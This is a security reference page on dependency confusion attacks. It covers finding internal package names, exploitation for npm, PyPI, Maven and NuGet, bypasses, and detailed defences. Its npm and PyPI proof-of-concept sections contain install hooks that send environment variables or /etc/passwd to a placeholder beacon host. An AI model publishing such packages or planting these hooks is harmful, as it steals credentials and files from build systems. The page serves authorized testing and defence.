# Dependency Confusion

> Alex Birsan's 2021 disclosure: a public package with the same name as a private internal dependency, but a higher version, can be pulled instead of the internal one by default resolution rules. Authorized testing only.

## TL;DR
- Affects npm, PyPI, RubyGems, Maven Central, NuGet, and any registry where the client falls back to a public mirror when an internal name is not found.
- Attack: discover internal package name (often via leaked `package.json` / `requirements.txt` / build logs in client-side bundles), publish a higher-versioned public package with that name + malicious `postinstall`, wait for victim CI to resolve.
- Defenders: scope (`@org/`) for npm, allow-list namespaces, separate index URLs (no fallback), package-pinning by hash, internal-name reservation on public registries.

## Detection / Discovery (red team)

### Find internal package names
- Inspect frontend-app bundles (`webpack` / `Vite` build artefacts) — internal modules often appear in source maps.
- Open-source repos accidentally referencing internal packages in `package.json`.
- GitHub code search across the org for `@<orgname>/`, `internal-*`, or other naming patterns.
- Job postings ("experience with our internal `xyz-utils` library") — Birsan-era classic.
- Public registry presence — `npm view <name>` returning 404 implies internal name.

### Confirm the resolver behaviour
```bash
# npm with a private registry but a fallback to npmjs.org (default)
npm config get registry
# If `https://registry.npmjs.org` is the default and no scoped registry is set,
# any internal package without a scope is a confusion target.

# pip with multiple --extra-index-url
pip config list
# `extra-index-url` to PyPI alongside an internal index = confusion (resolver picks
# the highest version across both indices).
```

## Exploitation

### npm
```bash
mkdir confusion-poc && cd confusion-poc
cat > package.json <<'EOF'
{
  "name": "internal-utils",
  "version": "999.999.999",
  "scripts": {
    "postinstall": "node -e \"require('https').get('https://<beacon>/'+Buffer.from(JSON.stringify(process.env)).toString('base64'))\""
  }
}
EOF
npm publish --access public
```
Wait for CI to run `npm install` and prefer the public `internal-utils@999.999.999` over the missing internal one.

### PyPI
```bash
mkdir confusion-poc && cd confusion-poc
cat > setup.py <<'EOF'
from setuptools import setup
setup(name="internal-utils", version="999.999.999",
      install_requires=[],
      cmdclass={"install": lambda *a, **k: __import__('os').system("curl -X POST --data-binary @/etc/passwd https://<beacon>/")})
EOF
python setup.py sdist bdist_wheel
twine upload dist/*
```
Modern PyPI flags suspicious `cmdclass` overrides; the lateral path is via `pip download` resolving the highest version. Defenders: use `--index-url` (singular, not `--extra-index-url`) pointing to your internal mirror that proxies PyPI; the mirror enforces "internal name not from public" rules.

### Maven / Gradle
- Maven Central + an internal Nexus repo configured as a `<repositories>` list with no priority. Maven picks the higher version.
- Mitigation: `<mirrorOf>*</mirrorOf>` in `settings.xml` pointing to your internal Nexus which acts as a proxy + name-reservation gateway.

### NuGet
- `nuget.config` with multiple `<packageSources>` is the entry point. Use `<packageSourceMapping>` (NuGet 6.0+) to bind a name pattern (`internal-*`) to a specific source.

## Bypasses
- Internal mirror exists but allows pass-through publish from the internet — package is cached on first download but the malicious version is what gets cached.
- Scoped packages (`@org/foo`) where the scope is unregistered on the public registry — anyone can register the scope and own `@org/<anything>`.
- Typosquatting variant (off-by-one name) bypasses dependency-confusion guards but is otherwise the same playbook.

## Defence / Remediation
- **npm**: use scoped names (`@yourorg/foo`) and reserve the `@yourorg` scope on npmjs.org. Set `.npmrc` so `@yourorg:registry=https://nexus.internal/...` is exclusive — no fallback for that scope. Mirror npmjs.org through a proxy registry; never pull directly.
- **PyPI**: use `--index-url` (singular) pointing to a proxy registry (Artifactory / Nexus / pip-internal) that enforces name reservation. Optional: pre-register the internal names on PyPI as squatter packages (clear ownership).
- **Maven**: declare a single `<mirror>` covering all upstreams; the mirror enforces name policy. Use `mvn dependency:tree` to surface unexpected coordinates.
- **NuGet**: `<packageSourceMapping>` 6.0+ — bind each name pattern to a single source.
- **Lockfiles + integrity hashes**: `package-lock.json` `integrity:` field, `requirements.txt` `--hash=sha256:…`, Gradle `verification-metadata.xml`. The lockfile pins the *content* — a registry swap produces a hash mismatch.
- **Air-gapped builds** for the high-value pipelines — internal mirror only, no internet at build time.
- **SBOM + signature verification** at install — see [./sbom-sigstore.md](./sbom-sigstore.md).
- **GitHub Dependency Review + Renovate + Socket / Snyk** to detect newly-published packages matching your name space and alert on consumption.
- **Reserve internal names on public registries** as a defensive measure (Birsan recommended this).

## Sources
- Alex Birsan — "Dependency Confusion" (Feb 2021): https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- OWASP Top 10 CI/CD Security Risks — CI/CD-SEC-03 Dependency Chain Abuse: https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-03-Dependency-Chain-Abuse.html
- npm scoped packages: https://docs.npmjs.com/cli/v10/using-npm/scope
- pip `--index-url` vs `--extra-index-url` guidance (PyPA): https://pip.pypa.io/en/stable/topics/secure-installs/
- NuGet packageSourceMapping: https://learn.microsoft.com/en-us/nuget/consume-packages/package-source-mapping
- Socket — supply-chain monitoring: https://socket.dev/
- Snyk's analysis of dependency confusion: https://snyk.io/blog/detect-prevent-dependency-confusion-attacks-npm-supply-chain-security/
